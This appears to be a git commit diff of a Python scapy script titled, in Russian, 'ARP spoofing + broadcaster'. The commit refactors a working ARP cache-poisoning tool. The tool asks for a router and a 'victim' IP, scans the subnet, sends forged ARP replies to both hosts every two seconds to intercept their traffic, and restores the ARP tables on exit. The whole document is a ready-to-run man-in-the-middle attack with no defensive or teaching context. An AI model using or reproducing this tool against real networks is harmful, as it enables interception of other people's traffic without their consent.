542858177b1e87aeacab5f6fe0be8000d5c3d34c
Владислав <167216979+V1ad0s1k100@users.noreply.github.com>
2024-10-19 19:40:18 +0700

    Update

--- ARP подмена + вещатель.py
+++ ARP подмена + вещатель.py
@@ -1,40 +1,32 @@
-import scapy.all as scapy 
-
-import time 
+import scapy.all as scapy
+import time
+    
 route = input('Введите ip адрес роутера (прим: X.X.X.X): ') 
 
-while True: 
+while True:
     print(scapy.arping(route+'/24'))
-    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ') 
-    if target == '' or target == ' ': 
-        continue
-    else: 
-        break 
-    
-def get_mac(ip): 
-    return scapy.getmacbyip(ip)
+    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ')
+    if target != '': break
 
 def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
     scapy.send(packet, verbose = False)
 
 def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc = source_mac)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=scapy.getmacbyip(destination_ip), psrc=source_ip, hwsrc = scapy.getmacbyip(source_ip))
     scapy.send(packet, count = 4, verbose = False)
 
 sent_pakets_count = 0
 
 try:
-    while True:
+    while True: #Отправка arp запросов жертве и маршрутизатору со стороны друг друга
         spoof(route, target)
         spoof(target, route)
-        sent_pakets_count = sent_pakets_count + 2 
-        print ("\r[+] Paket sent: " + str(sent_pakets_count), end="") 
+        sent_pakets_count += 2
+        print ("\r[+] Пакетов отправлено: " + str(sent_pakets_count), end="") 
         time.sleep(2)
-except KeyboardInterrupt: 
-    print("\n[+] Detected CTRL + C ...... Quitting.")
+        
+except KeyboardInterrupt: #Выход из arp таблицы жертвы и закрытие программы
+    print("\nБыло зафиксировано CTRL + C ...... Выход.")
     restore(target, route)
     restore(route, target)
